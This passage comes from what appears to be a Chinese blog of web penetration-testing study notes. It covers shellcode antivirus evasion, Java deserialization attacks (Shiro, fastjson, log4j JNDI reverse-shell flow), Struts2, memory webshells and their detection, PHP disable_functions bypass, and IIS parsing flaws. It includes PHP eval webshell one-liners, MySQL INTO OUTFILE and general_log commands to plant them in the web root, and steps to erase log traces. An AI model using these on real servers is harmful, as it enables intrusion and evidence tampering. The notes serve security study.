<p>2.\报错</p>
<p>3.十六进制字符串（php7 不是数字，php5 是）</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Cuk1bYq8Boq2zqxstKXcOMWvnNd.png" srcset="/img/loading.gif" lazyload></p>
<p>4.jspx CDATA 特性</p>
<blockquote>
<p>jsp 的后缀可以兼容为 jspx 的代码，也兼容 jspx 的所有特性，如 CDATA 特性 jspx 的后缀不兼容为 jsp 的代码，jspx 只能用 jspx 的格式 在 XML 元素里，&lt; 和&amp;是非法的，遇到 &lt; 解析器会把该字符解释为新元素的开始，遇到&amp;解析器会把该字符解释为字符实体化编码的开始 但是我们有时候有需要在 jspx 里添加 js 代码用到大量的 &lt; 和&amp;字符，因此可以将脚本代码定义为 CDATA CDATA 部分内容会被解析器忽略，此时 ameter 依旧会与 getPar 拼接成为 getParameter。</p>
</blockquote>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/YoZbbi8F5owxFqx29Ajcura9ndb.png" srcset="/img/loading.gif" lazyload></p>
<p>5.实体化编码</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/GGJgbeXjJozLdNxmIdscfVaXnJe.png" srcset="/img/loading.gif" lazyload></p>
<p>6.其他编码格式</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/GQz6bAqwuoEeocxKyUfcHWaVnnh.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf&#x2F;cs"></a>msf&#x2F;cs</h2><p>1.shellcode 加密</p>
<p>2.垃圾字节</p>
<p>3.硬编码单字节秘钥进行运算</p>
<p>4.移位</p>
<p>5.交换连续字节</p>
<h2 id="沙盒免杀"><a href="#沙盒免杀" class="headerlink" title="沙盒免杀"></a>沙盒免杀</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/UIlfbtq5QozI0KxTerbc0YX2n4f.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><blockquote>
<p>base 加密网站 <a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog (</a><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">ares-x.com</a><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">)</a></p>
</blockquote>
<blockquote>
<p>java-web 内存马 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p>
</blockquote>
<p><strong>rO0AB：base64 加密的 java 对象</strong></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079">https://xz.aliyun.com/t/7079</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7264">https://xz.aliyun.com/t/7264</a></p>
</blockquote>
<h3 id="JNDI-Java-命名和目录接口"><a href="#JNDI-Java-命名和目录接口" class="headerlink" title="JNDI(Java 命名和目录接口)"></a>JNDI(Java 命名和目录接口)</h3><p>JNDI 是一个接口，在这个接口下会有多种目录系统服务的实现，我们能名称等去找到相关的对象，并把它下载到客户端中来。—RMI OR LDAP</p>
<h3 id="RMI-远程方法调用"><a href="#RMI-远程方法调用" class="headerlink" title="RMI(远程方法调用)"></a>RMI(远程方法调用)</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>RMI 实现了 java 利用远程服务器为具体的 java 方法提供接口，本地只需要根据接口类的定义来提供参数即可调用，依靠 <strong>JRMP(远程方法协议)</strong></p>
<h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>1.传输的类必须可序列化</p>
<p>2.客户端服务器的 serialVersionUID 字段相同，</p>
<p>3.被远程调用方法的对象一定要实现 java.rmi.remote 接口，远程对象实现类必须继承 UnicastRemoteObject 类（或者构造方法调用 UnicastRemoteObject.exportObject()静态方法）</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/TB3zb4yneoiyxsx134scH38Mngc.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/PdyMb33REou8X1xZiL3cCVjPnMh.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="运行逻辑"><a href="#运行逻辑" class="headerlink" title="运行逻辑"></a>运行逻辑</h4><p>0.JDK 提供注册表功能，创建 RMIRegistry 对象监听 1099 端口</p>
<p>手动注册如下</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WC0NbySPLoRKBpxd60QcflHbnKd.png" srcset="/img/loading.gif" lazyload></p>
<p>1.服务器随机监听一个端口</p>
<p>2.客户端的 stub 通过 JRMP 协议封装数据,调用了上面的方法</p>
<p>3.连接服务端并提交参数</p>
<p>4.执行方法 返回结果给客户端</p>
<h2 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h2><p>(apache 安全框架）</p>
<h3 id="Shior550"><a href="#Shior550" class="headerlink" title="Shior550"></a>Shior550</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106475088">https://blog.csdn.net/Aaron_Miller&#x2F;article&#x2F;details&#x2F;106475088</a></p>
</blockquote>
<p><strong>取出请求包中 rememberMe 的 cookie 值 &#x3D;&gt; Base64 解码&#x3D;&gt;AES 解密（用到密钥 key,硬编码）&#x3D;&gt; 反序列化</strong>。知道了秘钥就可以控制反序列化的内容来构造链子</p>
<p>则 payload 构造：序列化&#x3D;&gt;AES 加密&#x3D;&gt;BASE64&#x3D;&gt; 写入 cookie</p>
<p>条件：获取 key，存在攻击链</p>
<blockquote>
<p>流程：攻击者搭建恶意 vps，存放反弹 shell（经过 base64 加密并且反序列化工具处理！这里的 base64 加密跟服务器无关，应该是为了免杀跟避免编码问题）的 payload1 并进行 JRMPListener，将上述 VPS JRMPListener 的地址进行 AES 加密和 base64 编码，构造请求包 cookie 中的 rememberMe 字段，向存在漏洞的服务器发送加密编码后的结果 payload2。<br>服务器接收到 payload2 进程 base64 解码 AES 解密，反序列化过程中触发 pop 链造成 payload2 中的语句执行，发现要和恶意 VPS 的 JRMP 通信，请求的过程中接收到了反弹 shell 的 payload1。</p>
</blockquote>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Rfedb2I1KoKqtAx3twfcd87FnTa.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h3><blockquote>
<p>由于 Apache Shiro cookie 中通过 AES-128-CBC 模式加密的 rememberMe 字段存在问题，用户可通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p>
</blockquote>
<p>条件：合法 cookie，攻击链</p>
<h3 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h3><p>利用http请求头：请求头修改随机字符，置空</p>
<p>利用shiro特性：rememberMe脏数据，空白字符</p>
<p>Host改成ip</p>
<h2 id="fastjson-反序列化"><a href="#fastjson-反序列化" class="headerlink" title="fastjson 反序列化"></a>fastjson 反序列化</h2><p>（json 跟 java 对象转换库）</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>
</blockquote>
<p>要求：RMI 服务的开启（x）,没过滤 json 格式，fastjson 版本</p>
<h3 id="fastjson-查看版本"><a href="#fastjson-查看版本" class="headerlink" title="fastjson 查看版本"></a>fastjson 查看版本</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/16537846.html">fastjson反序列化漏洞区分版本号的方法总结 - komomon - 博客园</a></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/KWtlbPdXSoJd9gxjZo9cC6opnnh.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Kpbcb10APoZLuQxqpoJcQrfgnwd.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastjson 可以操作任何 Java 对象，<strong>即使是一些预先存在的没有源码的对象</strong></p>
<p>AutoType 功能(代替了 setter&#x2F;getter，避免了两个对象反序列化丢失子类)，fastjson 在对 json 字符串反序列化的时候，<strong>会读取到 @type 的内容，将 json 内容反序列化为 java 对象并调用这个类的 setter 方法</strong>。</p>
<h3 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h3><p>1.JNDI打：（配合 RMI 服务）我们搭建一个远程恶意站点，然后构造语句去让服务器反序列的时候访问 rmi 服务器，rmi 服务器来执行我们在恶意站点上的 class 文件</p>
<p>2.传入恶意的 TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java 实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数</p>
<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>1.一种是直接将命令执行结果写入到静态资源文件里，如 html、js 等，然后通过 http 访问就可以直接看到结果</p>
<p>2.通过 dnslog 进行数据外带，但如果无法执行 dns 请求就无法验证了</p>
<p>3.直接将命令执行结果回显到请求 Poc 的 HTTP 响应中</p>
<h3 id="各版本"><a href="#各版本" class="headerlink" title="各版本"></a>各版本</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14872?time__1311=GqA2Y50K4IxBqDwqeqBKKiISDWT4zWxaroD#toc-4">Java中Fastjson各版本漏洞对抗史与总结 - 先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13386?time__1311=GqmxuiDQ0=D=G=D/briQdnSxfhWyDg7j7oD#toc-23">完全零基础入门Fastjson系列漏洞（基础篇） - 先知社区</a></p>
<h4 id="TemplatesTmpl链"><a href="#TemplatesTmpl链" class="headerlink" title="TemplatesTmpl链"></a>TemplatesTmpl链</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/20240618171234-e65c2f2c-2d52-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>TemplatesTmpl包的getTransletInstance方法对于成员属性_class下标为_transletIndexdex类进行实例化</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094601977.png" srcset="/img/loading.gif" lazyload alt="image-20241129094601977"></p>
<p>一直往上分析，可以发现就是_outputProperties属性的getter方法</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094707370-17328448279952.png" srcset="/img/loading.gif" lazyload alt="image-20241129094707370"></p>
<p>来到赋值类，_class类可控但是要求\bytecodes部位null，父类为ABSTRACT_TRANSLET</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129094818483-17328448989563.png" srcset="/img/loading.gif" lazyload alt="image-20241129094818483"></p>
<h4 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129095125508.png" srcset="/img/loading.gif" lazyload alt="image-20241129095125508"></p>
<p>好理解很多，setAutoCommit方法会调this.connect(当this.conn空),然后调用了lookup(this.getDataSourceName)</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241129095258496.png" srcset="/img/loading.gif" lazyload alt="image-20241129095258496"></p>
<p>发现还存在一个setDataSourceName方法导致DataSourceName可控</p>
<h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>(用于解析 java，部署大型分布式 Web 应用的 Web 中间件。）</p>
<p>分类：</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Hjw5b5XHQofnYuxKsuoc4D6Bnzg.png" srcset="/img/loading.gif" lazyload></p>
<p>1.weblogic 控制台的 7001 端口默认开启 T3 协议服务，T3 协议缺陷实现了 RMI</p>
<p>2.weblogic WLS Security 组件对外提供 webservice，使用 XMLDecoder 解析 XML 数据，存在反序列化漏洞</p>
<h2 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h2><p>（apache 日志库）</p>
<p>2.15.0&gt;log4j2&gt;2.0.0</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/BFVPbPpJjo19anxOaf3cGbFmncf.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/HT0TbHBsZoo4QUxSpaRc5kH3nFf.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="远程代码执行原理"><a href="#远程代码执行原理" class="headerlink" title="远程代码执行原理"></a>远程代码执行原理</h3><p>日志在打印的时候遇到 ${后以：分割为 prefix 和 key，对于 prefix 会调用 lookup 方法并且带入 key 参数</p>
<p>由于 JNDI 出栈没有做好过滤,攻击者利用 lookup 功能对{}内内容的解析进行 JNDI 注入，受害者请求远程服务来链接本地对象，在{}中调用 JNDI 接口（LDAP&#x2F;RMI 服务）向攻击者提前部署好的恶意站点获取恶意的.class 对象并运行代码</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Skekbkecbomq9QxJHFvcVk4onHh.png" srcset="/img/loading.gif" lazyload></p>
<p>此时的 JNDI 服务调用 RMI 服务，RMI 通过 Reference 类绑定了一个外部远程对象</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/J2DobQIXpoIyVPxFzfpcux7Fnvd.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="原理流程"><a href="#原理流程" class="headerlink" title="原理流程"></a>原理流程</h3><p>1.目标代码调用了 InitialContext.lookup(URI)且 URL 为恶意 RMI 地址</p>
<p>2.恶意 RMI 服务器返回一个 Reference 对象，其中有一个恶意的 factory 类</p>
<p>3.factory 被动态加载并且实例化，接着调用 factory.getObjectInstance()获取外部远程对象实例</p>
<p>（代码可以写入 factory 类的 getObjectInstance，构造方法，静态代码块等位置）</p>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>ldap</p>
<p>编写反弹 shell 语句，base64 编码。攻击机上存放恶意.java 文件并且编译为.class，同一目录下开启 http 服务，开启 LDAP 服务(1389 端口)</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/QcR8bXl6vo1aMqxVCbncLLVpnqc.png" srcset="/img/loading.gif" lazyload></p>
<p>再新建一个 shell 开启监听，在 JNDL 注入点，最后的是 class 文件名前缀，ip 是 http 服务的 ip</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/DPXqb3UMMoqOGIx7MsVcfzIinPg.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><h4 id="jdk（-8u191）"><a href="#jdk（-8u191）" class="headerlink" title="jdk（&gt;8u191）"></a>jdk（&gt;8u191）</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163323424.png" srcset="/img/loading.gif" lazyload alt="image-20241127163323424"></p>
<p>默认禁止了codebase的加载</p>
<p>绕过分析：ldap lookup的javaFactory（必须是ObjectFactory的子类）可以来自codebase或者本地的类地址，然后获得实例后构建JavaClassName指定的对象，最后log4j调用toString转换为字符串</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163705453.png" srcset="/img/loading.gif" lazyload alt="image-20241127163705453"></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163805742.png" srcset="/img/loading.gif" lazyload alt="image-20241127163805742"></p>
<p>那么 无法调用远程codebase的高版本jdk（&gt;8u191）只需要找到一个ObjectFactory子类且可利用的java本地类即可</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127164919024.png" srcset="/img/loading.gif" lazyload alt="image-20241127164919024"></p>
<p>例如BeanFactory类 他的默认构造函数可以实例化一个类的同时调用任意只有string参数的方法</p>
<p>再去利用ELProcessor类</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127165012947.png" srcset="/img/loading.gif" lazyload alt="image-20241127165012947"></p>
<h4 id="log4j2-2-15-rc1"><a href="#log4j2-2-15-rc1" class="headerlink" title="log4j2 (2.15-rc1)"></a>log4j2 (2.15-rc1)</h4><p>对jndi的host port 加载的java类型等进行了限制</p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127170940753.png" srcset="/img/loading.gif" lazyload alt="image-20241127170940753"></p>
<h2 id="struct2"><a href="#struct2" class="headerlink" title="struct2"></a>struct2</h2><p>.action \.do文件</p>
<p>OGNL：用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
<p>st2-045：注意请求头Content-Type</p>
<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><blockquote>
<p>原理：通过在 Java 虚拟机（JVM）中运行的恶意代码，实现对被攻击者系统的远程控制。其原理是通过在 Java 虚拟机中注入特定的 Java 类、变量或方法等 Java 对象，然后在 Java 虚拟机中运行这些代码，实现对受害者机器的远程控制</p>
</blockquote>
<h3 id="Tomcat-实现内存马的方式"><a href="#Tomcat-实现内存马的方式" class="headerlink" title="Tomcat 实现内存马的方式"></a><strong>Tomcat 实现内存马的方式</strong></h3><h4 id="Servlet-API-型"><a href="#Servlet-API-型" class="headerlink" title="Servlet-API 型"></a><strong>Servlet-API 型</strong></h4><p>  通过命令执行等方式动态注册一个新的 listener、filter 或者 servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如 tomcat 的 value 内存马</p>
<h5 id="filter-型内存马"><a href="#filter-型内存马" class="headerlink" title="filter 型内存马"></a><strong>filter 型内存马</strong></h5><p>  所谓 filter 内存马，就是在 web 容器中创建了含有恶意代码的 filter，在请求传递到 servlet 前被拦截下来且执行了恶意代码。</p>
<h5 id="servlet-型内存马"><a href="#servlet-型内存马" class="headerlink" title="servlet 型内存马"></a><strong>servlet 型内存马</strong></h5><p>  servlet 型的内存马原理就是注册一个恶意的 servlet，与 filter 相似，只是创建过程不同。</p>
<p>  核心还是看 StandardContext，在 init filter 后就调用了 loadOnStartup 方法实例化 servlet</p>
<p>  可以发现 servlet 的相关信息是保存在 StandardContext 的 children 字段。</p>
<h5 id="listener-型内存马"><a href="#listener-型内存马" class="headerlink" title="listener 型内存马"></a><strong>listener 型内存马</strong></h5><p>  listener 用于监听时间的发生或状态的改变，其初始化与调用顺序在 filter 之前。</p>
<p>  listener 选择很多。我们选择与 request 相关的 ServletRequestListener。</p>
<p>  Tomcat 使用两类 Listener 接口分别是 org.apache.catalina.LifecycleListener 和原生 Java.util.EventListener。</p>
<p>  一般作为 webshell，需要对网站发送请求使用 Java.util.EventListener。</p>
<h4 id="字节码增强型"><a href="#字节码增强型" class="headerlink" title="字节码增强型"></a><strong>字节码增强型</strong></h4><p>  通过 java 的 instrumentation 动态修改已有代码，进而实现命令执行等功能。</p>
<h4 id="查杀思路"><a href="#查杀思路" class="headerlink" title="查杀思路"></a><strong>查杀思路</strong></h4><ul>
<li><p>检查日志，相同路径但是参数不同，页面不存在返回200</p>
</li>
<li><p>中间件日志报错</p>
</li>
<li><p>流量分析</p>
</li>
<li><p>利用 Java Agent 遍历加载到内存中的 Class</p>
</li>
<li><p>先判断是否是内存马，是则进入内存查杀。</p>
</li>
</ul>
<h4 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a><strong>特征判断</strong></h4><ul>
<li><p>（关键字）根据 shell 或者随机数关键字</p>
</li>
<li><p>（优先级）根据 Filter 优先级；为了使权限最大化，保证在各种情况下都可以访问，需要把优先级调到最高</p>
</li>
<li><p>（加载器）根据特殊的 classloader（类加载器）、 Filter 对应的 ClassLoader 目录进行检测； Filter 也是一种 Class，必定需要特定的 classloader（类加载器）</p>
</li>
<li><p>（恶意代码）把内存中 class 导出，反编译之后查看是否存在恶意代码；如调用的了一些特殊的方法</p>
<ul>
<li>java.lang.Runtime.getRuntime</li>
<li>defineClass</li>
<li>Invoke</li>
</ul>
</li>
<li><p>（配置）web.xml 中没有 fitter 配置</p>
</li>
</ul>
<h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>Jboss 是一个管理 EJB 的容器和服务器。</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>jbossmq-httpil&#x2F;HTTPServerILServlet<br>invoker&#x2F;readonly<br>invoker&#x2F;JMXInvokerServlet</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>程序获取 http 请求数据保存到 httpRequest 中，进一步处理后保存到变量 ois 中，然后程序没有对该数据进行过滤，直接使用 readObject()方法进行反序列化。</p>
<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><h3 id="Select-into-outfile-写入"><a href="#Select-into-outfile-写入" class="headerlink" title="Select into outfile 写入"></a>Select into outfile 写入</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>1.web 目录写权限以及单引号</p>
<p>2.绝对路径（phpinfo&#x2F;php 探针&#x2F;报错）</p>
<p>3.secure_file_priv 没有具体值</p>
<blockquote>
<p>show global variables like ‘%secure%’; 查看当前设置<br>1.当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权</p>
<ol start="2">
<li>当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入 | 导出只能发生在 &#x2F;tmp&#x2F; 目录下，此时也无法提权</li>
<li>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权 在 MySQL 的配置文件 my.ini 中进行配置</li>
</ol>
</blockquote>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; INTO OUTFILE &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\a.php&#x27; 这里需要注意的一个点是路径需要用”\“</span><br></code></pre></td></tr></table></figure>

<h3 id="日志写入"><a href="#日志写入" class="headerlink" title="日志写入"></a>日志写入</h3><p>1.查看配置</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">SHOW <span class="hljs-keyword">VARIABLES</span> LIKE ‘<span class="hljs-comment">%general%</span><br>查看mysql的日志状态，默认是关闭的<br>general_log_file为日志保存的位置<br></code></pre></td></tr></table></figure>

<p>2.开启 general_log 模式</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log = <span class="hljs-keyword">on</span>;<br>记录用户输入的每条命令并保存在 C:\phpStudy\MySQL\<span class="hljs-built_in">data</span>\stu1.<span class="hljs-keyword">log</span> 的文件中<br>开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过<span class="hljs-keyword">log</span>日志进行写入一句话木马，然后再进一步利用<br></code></pre></td></tr></table></figure>

<p>3.修改日志目录为 shell 地址</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>4.写入 shell 并连接利用</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>5.抹除痕迹</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">off</span>;<br><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="绕过disable-funcion"><a href="#绕过disable-funcion" class="headerlink" title="绕过disable_funcion"></a>绕过disable_funcion</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1sh/p/12632126.html">bypass disable_function的方法及蚁剑插件bypass-php-function使用 - zw1sh - 博客园 (cnblogs.com)</a></p>
</blockquote>
<h3 id="apache-mod-cgi"><a href="#apache-mod-cgi" class="headerlink" title="apache mod_cgi"></a>apache mod_cgi</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173315087.png" srcset="/img/loading.gif" lazyload alt="image-20240627173315087"></p>
<p>前提<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173252656.png" srcset="/img/loading.gif" lazyload alt="image-20240627173252656"></p>
<p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173423213.png" srcset="/img/loading.gif" lazyload alt="image-20240627173423213"></p>
<h3 id="LD-preload"><a href="#LD-preload" class="headerlink" title="LD_preload"></a>LD_preload</h3><p>写一个动态链接文件<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240906104037469.png" srcset="/img/loading.gif" lazyload alt="image-20240906104037469"></p>
<h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h4 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h4><h4 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h4><h2 id="PHP-爆路径"><a href="#PHP-爆路径" class="headerlink" title="PHP 爆路径"></a>PHP 爆路径</h2><p>单引号，错误路径报错</p>
<p>phpinfo 和 phpmyadmin 探针</p>
<p>任意文件读取</p>
<p>图片路径</p>
<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>路径：(_SERVER[“SCRIPT_FILENAME”])</p>
<p>支持程序：如redis，mysql，fastcgi，gopher</p>
<p>真实ip：(_SERVER[“SERVER_ADDR”] （绕cdn）</p>
<p>敏感配置：远程文件包含，文件读取，禁用函数名，基础目录，短标签，配置文件位置</p>
<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="罕见后缀名"><a href="#罕见后缀名" class="headerlink" title="罕见后缀名"></a>罕见后缀名</h3><p>asa cer cdx</p>
<h3 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h3><p>ap.asp;,jpg </p>
<h3 id="PUT文件上传"><a href="#PUT文件上传" class="headerlink" title="PUT文件上传"></a>PUT文件上传</h3><h3 id="MS15-034"><a href="#MS15-034" class="headerlink" title="MS15-034"></a>MS15-034</h3><p>HTTP.sys RCE</p>
<h3 id="文件夹解析-5-x-6-x"><a href="#文件夹解析-5-x-6-x" class="headerlink" title="文件夹解析**(5.x-6.x**)"></a>文件夹解析**(5.x-6.x**)</h3><p>&#x2F;xx.asp&#x2F;xx.jpg(控制文件夹名字就可以让此文件夹下文件执行) </p>
<h3 id="CGI漏洞-7-0-7-5-：默认开启-Fast-CGI"><a href="#CGI漏洞-7-0-7-5-：默认开启-Fast-CGI" class="headerlink" title="CGI漏洞(7.0-7.5)：默认开启 Fast-CGI"></a>CGI漏洞(7.0-7.5)：默认开启 Fast-CGI</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Su01byOoWoZ48pxdmpUc24l5nud.png" srcset="/img/loading.gif" lazyload></p>
<p>上传如上文件，访问路径&#x2F;1.jpg&#x2F;.php 会导致图片被解析为 php 并生成 shell </p>
